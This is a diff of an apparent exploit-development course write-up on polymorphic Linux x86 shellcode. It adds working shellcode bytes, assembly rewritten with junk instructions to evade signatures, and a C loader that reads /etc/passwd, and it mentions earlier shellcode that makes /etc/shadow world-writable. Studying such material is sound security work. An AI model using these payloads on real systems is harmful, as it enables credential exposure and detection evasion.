@@ -23,9 +23,9 @@ Our goal is to not increase the size of the shellcode by more than 50%.
 
 The format of these posts will be me posting the assembly of the original shellcode, along with its author and a link, and then posting my polymorphic version below with major changes commented. Let's begin!
 
-## Shellcode 1
+## Shellcode 1 `chmod(/etc/shadow, 0666) & exit()`
 
-`chmod(/etc/shadow, 0666) & exit()` by ka0x, located [here](http://shell-storm.org/shellcode/files/shellcode-556.php)
+This shellcode was written by ka0x, and is located [here](http://shell-storm.org/shellcode/files/shellcode-556.php).
 
 Size: 33 Bytes
 
@@ -136,11 +136,184 @@ root@kali:/etc# ls -lah | grep shadow
 -rw-rw-rw-   1 root    shadow  1.8K Jan 21 00:36 shadow
 ```
 
+Size: 40 bytes
+Increase: 21%
+
 The shadow file has `666` permissions, our code was a success! 
 
-Size increase: 21%
+## Shellcode 2 `Tiny Read File Shellcode - C Language - Linux/x86`
+
+This shellcode was written by Geyslan G. Bem, and is located [here](http://shell-storm.org/shellcode/files/shellcode-842.php). This shellcode will read an arbitrary file, we will be using `/etc/passwd`.
+
+Size: 51 bytes 
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+unsigned char shellcode[] = \
+
+              "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73"
+              "\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f"
+              "\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03"
+              "\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92"
+              "\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd"
+              "\x80";
 
 
+main ()
+{
+
+    // When contains null bytes, printf will show a wrong shellcode length.
+
+    printf("Shellcode Length:  %d\n", strlen(shellcode));
+
+    // Pollutes all registers ensuring that the shellcode runs in any circumstance.
+
+    __asm__ ("movl $0xffffffff, %eax\n\t"
+            "movl %eax, %ebx\n\t"
+            "movl %eax, %ecx\n\t"
+            "movl %eax, %edx\n\t"
+            "movl %eax, %esi\n\t"
+            "movl %eax, %edi\n\t"
+            "movl %eax, %ebp\n\t"
+
+            // Calling the shellcode
+            "call shellcode");
+
+}
+```
+
+Let's use `ndisasm` on this shellcode like we did last assignment to get some assembly out of it. 
+
+```terminal_session
+root@kali:~# echo -ne "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u -
+```
+
+Output assembly:
+```nasm
+xor ecx,ecx 
+mul ecx 
+mov al,0x5 
+push ecx 
+push dword 0x64777373
+push dword 0x61702f63
+push dword 0x74652f2f
+mov ebx,esp 
+int 0x80 
+xchg eax,ebx 
+xchg eax,ecx 
+mov al,0x3 
+xor edx,edx 
+mov dx,0xfff 
+inc edx 
+int 0x80 
+xchg eax,edx 
+xor eax,eax 
+mov al,0x4 
+mov bl,0x1 
+int 0x80 
+xchg eax,ebx 
+int 0x80 
+```
+
+This shellcode already uses a lot of the tricks we've learned over the last few lessons, but we can still change quite a bit of it. Let's see what we can do.
+
+```nasm
+global _start
+
+
+section .text
+
+_start:
+	xor ecx,ecx
+	xor eax,eax
+	xor edx,edx			; longer way to clear these 3 registers 
+	mov al,0x5 
+	push edx			; can switch this to any of the cleared registers as we're just pushing a null, changed to edx 
+	push dword 0x64777373
+	push dword 0x61702f63
+	push dword 0x74652f2f
+	mov ebx,esp 
+	int 0x80
+	push eax			; Step 1
+	push ebx			; Step 2
+	push ecx			; Step 3
+	pop eax				; Step 4
+	pop ecx				; Step 5
+	pop ebx 			; Step 6, we just replaced two simple xchg opcodes with 6 lines of push/pops
+	mov al,0x3  
+	mov dx,0xfff			; deleted previous line which was xor edx,edx since edx is still zeroed 
+	inc edx 
+	int 0x80
+	push eax			; Step 1
+	push edx			; Step 2
+	pop eax				; Step 3
+	pop edx	 			; Step 4, we just replaced a simple xchg opcde with 4 lines of push/pops 
+	xor eax,eax 
+	mov al,0x4 
+	mov bl,0x1 
+	int 0x80
+	push eax			; Step 1
+	push ebx			; Step 2
+	pop eax				; Step 3
+	pop ebx				; Step 4, we just replaced a simple xchg opcode with 4 lines of push/pops 
+```
+
+As you can see from the comments, we had to add some nonsense since the original code was pretty clean. I **did** find a line that wasn't needed which I deleted so that was somewhat gratifying to increase the code's efficiency in at least some way. 
+
+Let's assemble and link our code:
+```terminal_session
+root@kali:~# nasm -f elf32 read.nasm && ld -m elf_i386 read.o -o read
+```
+
+Let's dump the shellcode:
+```terminal_session
+root@kali:~# objdump -d ./read|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc9\x31\xc0\x31\xd2\xb0\x05\x52\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x50\x53\x51\x58\x59\x5b\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x50\x52\x58\x5a\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x50\x53\x58\x5b\xcd\x80"
+```
+
+Let's paste into our shellcode.c
+```c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xc9\x31\xc0\x31\xd2\xb0\x05\x52\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x50\x53\x51\x58\x59\x5b\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x50\x52\x58\x5a\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x50\x53\x58\x5b\xcd\x80";
+
+
+
+main()
+{
+
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+```
+
+Finally, let's compile and run it!
+```terminal_session
+root@kali:~# gcc -fno-stack-protector -z execstack -m32 shellcode.c -o read2
+shellcode.c:9:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
+ main()
+ ^~~~
+root@kali:~# ./read
+Shellcode Length:  61
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+-----snip-----
+```
+Size: 61 bytes
+Increase: 22%
+
+We were able to read `/etc/passwd`, it works!
 
 ## Github
 
